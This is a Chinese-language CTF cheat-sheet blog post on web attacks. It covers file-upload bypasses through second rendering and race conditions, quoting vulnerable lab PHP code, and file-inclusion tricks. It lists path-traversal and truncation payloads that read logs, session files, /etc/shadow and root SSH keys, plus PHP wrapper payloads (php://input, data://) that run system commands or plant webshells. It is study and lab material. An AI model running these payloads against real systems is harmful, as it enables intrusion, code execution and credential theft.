<p>在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区</p>
<p>对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的</p>
<p>二次渲染</p>
<p>imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$tmpname</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
    <span class="token variable">$target_path</span><span class="token operator">=</span><span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token comment">// 获得上传文件的扩展名</span>
    <span class="token variable">$fileext</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token comment">//判断文件后缀与类型，合法才进行上传操作</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token comment">//使用上传的图片生成新的图片</span>
            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是jpg格式的图片！"</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token comment">//给新图片指定文件名</span>
                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>
                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                <span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
 
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token comment">//使用上传的图片生成新的图片</span>
            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                 <span class="token comment">//给新图片指定文件名</span>
                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>
                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>               
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
 
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token comment">//使用上传的图片生成新的图片</span>
            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不是gif格式的图片！"</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token comment">//给新图片指定文件名</span>
                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>
                <span class="token variable">$newimagepath</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                <span class="token function">imagegif</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$newimagepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>
                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>
                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。<br>绕过方法</p>
<p>得去找图片经过GD库转化后没有改变的部分，再将未改变的部分修改为相应的php代码。</p>
<p>条件竞争</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>
 
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。<br>绕过方法</p>
<p>然后不断访问webshell：</p>
<p>上传成功。</p>
<p>参考链接：</p>
<pre><code>https://blog.csdn.net/Kevinhanser/article/details/81613003
https://secgeek.net/bookfresh-vulnerability/
https://xz.aliyun.com/t/2435
</code></pre>
<hr>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>00截断</p>
<p>构造长目录截断</p>
<p>但是光防御0字节是肯定不够的。俗话说上有政策下有对策，国内的安全研究者cloie发现了一个技巧——利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</p>
<p>目录字符串在Windows下256字节、Linux下4096字节时达到最大值，最大值长度之后的字符将被丢弃。</p>
<p>而只需通过【.&#x2F;】就可以构造出足够长的目录。比如</p>
<p>.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;passwd</p>
<p>或者</p>
<p>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;passwd</p>
<p>又或者</p>
<p>..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc..</p>
<p>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)<br>点号截断</p>
<p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini&#x2F;………[…]…………</p>
<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
<p>本地文件包含的利用技巧</p>
<p>本地文件包含漏洞，是有机会执行php代码的，但这取决于一些条件</p>
<p>经过不懈研究，安全研究者总结出了一下几种常见的技巧，用于本地文件包含后执行php代码。</p>
<p>（1）包含用户上传的文件</p>
<p>（2）包含data:&#x2F;&#x2F;或php:&#x2F;&#x2F;input等伪协议</p>
<p>（3）包含session文件</p>
<p>（4）包含日志文件</p>
<p>（5）包含&#x2F;proc&#x2F;self&#x2F;environ</p>
<p>（6）包含上传的临时文件</p>
<p>（7）包含其他应用创建的文件，如数据库文件，缓存文件，应用日志等，需具体问题具体分析<br>常见利用方式</p>
<?phpinclude("inc/" . $_GET['file']); ?>

<pre><code>包含同目录下的文件：
</code></pre>
<p>?file&#x3D;.htaccess</p>
<pre><code>目录遍历：
</code></pre>
<p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;locate.db</p>
<p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db</p>
<p>（linux中这两个文件储存着所有文件的路径，需要root权限）</p>
<pre><code>包含错误日志：?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志）

获取web目录或者其他配置文件：
</code></pre>
<p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</p>
<pre><code>包含上传的附件：
</code></pre>
<p>?file&#x3D;..&#x2F;attachment&#x2F;media&#x2F;xxx.file</p>
<pre><code>读取session文件：
</code></pre>
<p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_tnrdo9ub2tsdurntv0pdir1no7</p>
<p>（session文件一般在&#x2F;tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在&#x2F;var&#x2F;lib&#x2F;php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</p>
<pre><code>如果拥有root权限还可以试试读这些东西：
</code></pre>
<p>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p>
<p>&#x2F;root&#x2F;.ssh&#x2F;id_rsa</p>
<p>&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</p>
<p>&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</p>
<p>&#x2F;root&#x2F;.ssh&#x2F;known_hosts</p>
<p>&#x2F;etc&#x2F;shadow</p>
<p>&#x2F;root&#x2F;.bash_history</p>
<p>&#x2F;root&#x2F;.mysql_history</p>
<p>&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]* (文件标识符)</p>
<p>&#x2F;proc&#x2F;mounts</p>
<p>&#x2F;proc&#x2F;config.gz</p>
<pre><code>如果有phpinfo可以包含临时文件：
</code></pre>
<hr>
<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>详细：<a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a></p>
<p>简略版：<br>    在实战中文件包含漏洞配合PHP的伪协议可以发挥重大的作用,比如读取文件源码,任意命令执行或者开启后门获取webshell等,常用的伪协议有</p>
<pre><code>    php://filter 读取文件源码
    php://input 任意代码执行
    data://text/plain 任意代码执行
    zip:// 配合文件上传开启后门
</code></pre>
<p>下面拿ctf.show WEB模块的第3关举个栗子,这一关存在文件包含漏洞<br>php:&#x2F;&#x2F;filter</p>
<p>php:&#x2F;&#x2F;filter 协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码</p>
<p>使用文件包含函数包含文件时,文件中的代码会被执行,如果想要读取文件源码,可以使用base64对文件内容进行编码,编码后的文件内容不会被执行,而是展示在页面中,我们将页面中的内容使用base64解码,就可以获取文件的源码了</p>
<p>使用base64对index.php文件进行编码,可以看到页面中展示了编码后的文件内容</p>
<p>?url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<p> 接下来我们将编码后的文件内容进行base64解密,可以得到文件源码</p>
<p>php:&#x2F;&#x2F;input</p>
<p>php:&#x2F;&#x2F;input 可以访问请求的原始数据,配合文件包含漏洞可以将post请求体中的内容当做文件内容执行,从而实现任意代码执行,需要注意的是,当enctype&#x3D;multipart&#x2F;form-data时,php:&#x2F;input将会无效</p>
<pre><code>?url=php://input				-- GET请求参数中使用php://input协议
&lt;?php system(&#39;ls&#39;); ?&gt;			-- post请求体中的内容会被当做文件内容执行
</code></pre>
<p>data:&#x2F;&#x2F;</p>
<p>协议格式: data:资源类型;编码,内容</p>
<p>data:&#x2F;&#x2F;协议通过执行资源类型,使后面的内容当做文件内容来执行,从而造成任意代码执行</p>
<p>?url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('id') ?></p>
<p>zip:&#x2F;&#x2F;</p>
<p>ziip:&#x2F;&#x2F;协议用来读取压缩包中的文件,可以配合文件上传开启后门,获取webshell</p>
<p>将shell.txt压缩成zip,再将后缀名改为jpg上传至服务器,再通过zip伪协议访问压缩包里的文件,从而链接木马</p>
<p>?url&#x3D;zip:&#x2F;&#x2F;shell.jpg</p>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/10/22/miao/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/10/09/miscwav/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-10-18 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/速查/">速查<span>4</span></a></li> <li><a href="/categories/速查/CTF/">CTF<span>1</span></a></li>

<div class="widget tag">
  <h3 class="title">All Categories</h3>
     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E6%8C%96%E6%8E%98/">SRC挖掘</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">21</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Crypto/">Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/PWN/">PWN</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Web/">Web</a><span class="category-list-count">9</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E5%8D%9A%E5%AE%A2/">博客</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/">OSCP</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/">Vulnhub</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" 